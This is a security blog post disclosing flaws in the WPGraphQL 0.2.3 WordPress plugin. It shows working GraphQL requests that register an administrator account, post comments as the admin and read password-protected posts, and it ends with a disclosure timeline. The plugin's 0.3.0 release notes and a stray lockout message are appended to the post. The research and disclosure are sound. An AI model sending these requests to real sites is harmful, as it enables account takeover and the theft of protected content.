# Pwning WordPress GraphQL

Simone Q
08 May 2019

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql-HEADER.png)

Third-party plugins are often the security Achilles heel of Content Management Systems (CMS). It seems like not a month goes by without one security researcher or another uncovers a vulnerability in a plugin, undermining the security of the whole platform.

Plugins are used to add functionality that’s missing from the core CMS, but using them can be fraught as not all plugins are created equal. What you hope will add to the user (and Admin) experience could well be the undoing of your security.

In this post we analyse the security of the increasingly popular [WPGraphQL](https://www.wpgraphql.com/)  plugin.

GraphQL is a query language for APIs that was open-sourced by Facebook in 2015 and has been used in production by Facebook since 2012. The plugin brings that functionality to WordPress websites.

### TL;DR?

Without authorisation, weak access controls allow us to:

* Create administrative users
* Post comments on articles bypassing article restrictions and global moderation
* Retrieve content of password-protected posts/articles/pages
* Retrieve full list of registered users in the platform
* Retrieve full list of media, comments, themes and plugins with one simple request

The test was performed locally using WordPress 5.1.1 and WPGraphQL 0.2.3

### Where do I start?

‘Introspection’ is the answer! It’s a philosophical approach that serves us well here. We can ask GraphQL schema to list what queries it supports through the following introspection request:

```
{
 __schema{
  queryType{
   name,
   fields{
    name,
    description
          }
        }
      }
}
```

Once parsed, we can identify queries and mandatory parameters we will need to use.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql1.png)

Because WPGraphQL is open source it was easy to identify unprotected functionality, where user’s privileges were not checked before serving the response to the query.

### Create administrative users

By exploiting this issue, registrations must be open in WordPress. However, it’s possible to specify the role of the user we’re registering:

```
mutation{
  registerUser(input: {
    clientMutationId: "UWHATM8",
    email: "[[email protected]](/cdn-cgi/l/email-protection)",
    password: "SuperSecretPassword",
    username: "adm1n",
    roles:["administrator"] })
  {
    clientMutationId
  }
}
```

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql2-1024x121.png)

In that example “UWHATM8” is just a random string.

Creating an administrative account on WordPress allows a remote attacker to execute arbitrary code by injecting PHP code in themes, plugins or header.php file of WordPress.

### Post comments on articles bypassing article restrictions and global moderation

This vulnerability is also present when comments are moderated globally and if article/post/page comments are disallowed.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql3.png)

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql4.png)

```
mutation{
  createComment(input: {
    postId:6,
    userId:1,
    content:"Test Comment",
    clientMutationId: "UWHATM8"
   })
  {
    clientMutationId
  }
}
```

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql5.png)

The comment will show as approved because the impersonation of the admin user is trusted by the system.

### Retrieve content of password-protected posts/articles/pages

Protected posts/articles/pages are always shown on the main website, but without password the content is not visible, until now…

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql6.png)

The following GraphQL request filters all posts with a password set and show their content in RAW format:

```
{posts(where: {hasPassword: true}){
  edges{
    node{
      title,
      id,
      content(format:RAW)
     }
   }
 }
}
```

Resulting in the content of the article to be disclosed to unauthorised users:

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql7.png)

I developed PoC exploit code for all attack vectors and it’s [available here](https://github.com/pentestpartners/snippets/blob/master/wp-graphql0.2.3_exploit.py) on the PTP GitHub repository.

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql8-1024x668.png)

![](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![](https://www.pentestpartners.com/content/uploads/2019/05/wpgraphql9-1024x136.png)

### Lessons learned

Despite the small impact of this research compared to a core CMS vulnerability, it is important to understand two important concepts:

* As a user, are you aware of all the functionality of the plugin you’re using? Do you perform a source code review before installing it?
* As a developer, it is important to keep in mind whom has access to data. Do they need to be authenticated to perform a specific action?

All those issues were addressed in WPGraphQL version 0.3.0

### Disclosure timeline

23/03/2019: First contact with the wp-graphql team to report the vulnerabilities

26/03/2019: Confirmation that the issues will be address in version 0.3.0

06/04/2019: Version 0.3.0 released to the public

# 🚀 Release Notes

## 💥 BREAKING CHANGES & 📖 UPGRADE GUIDE

These features required re-architecting quite a bit of the internals of the plugin. Some classes, functions and filters no longer exist, so if you had a codebase that extended WPGraphQL in any way, we recommend reading the [upgrade guide](https://www.wpgraphql.com/2019/04/05/upgrading-to-v0-3-0/).

## 🗒 Release Summary

This release had 2 primary focuses: **Model Layer** and **DataLoader (Deferred Resolvers)**. These 2 features are critical to the performance and security of WPGraphQL. Below are some highlights of these features, but you can read more about them [here](https://www.wpgraphql.com/2019/03/27/whats-coming-in-v0-3-0/) as well.

There are also other new features and bugfixes listed below.

### ⚡️DataLoader

The role of DataLoader is to efficiently load data. It makes use of Deferred resolution of fields, allowing for the fetching of data to happen in batches. You can read more about it [here](https://docs.wpgraphql.com/guides/deferred-resolvers) and [here](https://github.com/wp-graphql/wp-graphql/pull/722#issue-261315185):

### 🔐 Model Layer

The primary role of the Model Layer is to centralize access checks for objects. Some examples: a "draft" post should only be accessible to authenticated users with proper capabilities to edit posts. User email addresses should only be exposed to authenticated users with the "list\_users" capability. Themes and plugins should only be accessible to authenticated users with proper capabilities as well.

Prior to this release, WPGraphQL helped expose various Types of data, but left the responsibility of controlling "Access" to the site owner by filtering field resolvers and handling Auth checks themselves.

This release puts much more responsibility on the core WPGraphQL plugin where it has a much more restrictive by default approach to exposing data. Data that a vanilla WordPress install doesn't publicly exposed is no longer publicly exposed by WPGraphQL.

Each field can be modified by filters, so if the restrictions WPGraphQL imposes are *too* restrictive, site owners can still adjust the restrictions to allow access to whatever they want users to have access to.

You can read a bit more about this [here](https://www.wpgraphql.com/2019/03/27/whats-coming-in-v0-3-0/) and [here](https://docs.wpgraphql.com/guides/model-layer)

## 💥 Breaking Changes

As mentioned above, there are many breaking changes, specifically to how internal data is resolved. Below we've listed some high level breaking changes to look out for, but we recommend reading the [upgrade guide](https://www.wpgraphql.com/2019/04/03/upgrading-to-v0-3-0/) for more information.

* Connection Resolvers have been completely revamped. If you've written your own ConnectionResolvers by extending any of the Connection classes, you will need to refactor your connection. The ConnectionResolvers were previously classes with static functions. They are no longer static, and maintain state of the connection. This allows for the connections to have proper context to pass through to pageInfo and the like. You can read about registering new connections here: <https://docs.wpgraphql.com/extending/connections>
* "roles" on users is now a Connection instead of a listOf strings. (ex: `{user { id, roles { nodes { id, name } } } }`)
* CommentMutation input changed the field `postId` to `commentOn`. The field is the ID of the Post Object that the comment should be connected to, but can be an ID of any Post Type.

### Security Audit

We had a formal security audit performed on the plugin by [Simone Quatrini of Pen Test Partners](https://www.pentestpartners.com/). Fortunately, most of the issues reported by the audit were already being resolved by the Model Layer we had in progress at the time we received the report. Some additional issues were brought to our attention that were not on our radar and were addressed in this release. We recommend updating to this latest version to benefit from all the new features as well as the security fixes. In a week or two, we will publish more information about the security audit, but want to give folks the chance to update the plugin to the latest version before disclosing the issues that were reported.

## ✨ New Features

Some of these new features were also mentioned above in Breaking Changes.

* **Updated Docker config** for Travis CI tests to run in PHP 7.3. Thanks [@mngi-arogers](https://github.com/mngi-arogers)!
* **New CursorBuilder class** to provide more stability to cursor based pagination. Really great work here, [@epeli](https://github.com/epeli)!
* Travis CI is now running PHP Code Sniffer checks on the codebase. Currently set to allow fail, but sets us up to get closer to fully adopting WordPress Core Code Standards. Although, [they may be changing](https://make.wordpress.org/core/2019/03/26/coding-standards-updates-for-php-5-6/) soon too. Thanks [@renatonascalves](https://github.com/renatonascalves) for hooking up Travis to run the sniffs!
* **DataLoader / Deferred Resolvers:** This release implements Deferred resolution throughout the entire codebase and provides a way for other datasources to take advantage of the same advantages. You can read more about Deferred resolution here: <https://docs.wpgraphql.com/guides/deferred-resolvers/>
* **Loaders added to AppContext:** DataLoader classes are now registered within AppContext and passed down to all Resolvers to make use of already cached data and centralized fetching (instead of relying on Globals). As part of this we got things hooked things up to allow for additional third party loaders to be added to AppContext via filter. Thanks for your work on this, [@kidunot89](https://github.com/kidunot89)!
* **Revamped Connection Resolvers:** Along with DataLoader, we revamped resolvers for Connections, making it much easier to create custom connection resolvers. You can read about registering connections here: <https://docs.wpgraphql.com/extending/connections>
* **Model Layer:** You can read more about the Model Layer here: <https://docs.wpgraphql.com/guides/model-layer>. Thanks for all your work on this feature, [@CodeProKid](https://github.com/CodeProKid)!
* **Revisions Support:** You can now query revisions of Posts (or post\_types).
* **DataSource methods expect different arguments now**. You must pass `$context` from resolvers to the DataSource methods now, to take advantage of Deferred resolution.
* **Resolvers now receive instances of a Model** instead of instances of `\WP_Post` or `\WP_User`, etc. If you were registering fields to PostObject Types, or Term Types or User Types, or almost anything, if the object being passed as the first argument of the resolver was a core `\WP_*` class instance, it will now be a WPGraphQL `Model` instance. . .for example: `\WP_Post` is now `\WPGraphQL\Model\Post` being passed in.

## 🐛 Bugfixes

* Adjustments to Cursor ordering / filters to support order by meta (or other values). Thanks [@epeli](https://github.com/epeli)!
* All sorts of access control data leaks. The Model Layer now restricts data that should be restricted and exposes it only to those with proper capabilities to view it. Thanks again to Simone for working with us on the Security Audit and providing us with a detailed report, and verifying that the issues had been properly resolved in this release!

LOCKED OUT⛔ 24 hour lockout initiated

hi. we regret to inform you that a condition has occurred that has resulted in a 24 hour lockout. this occurs when rate limiting controls are exceeded or when someone attempts to hack the system but fails too many times. we wish you luck in your future attempts tomorrow.
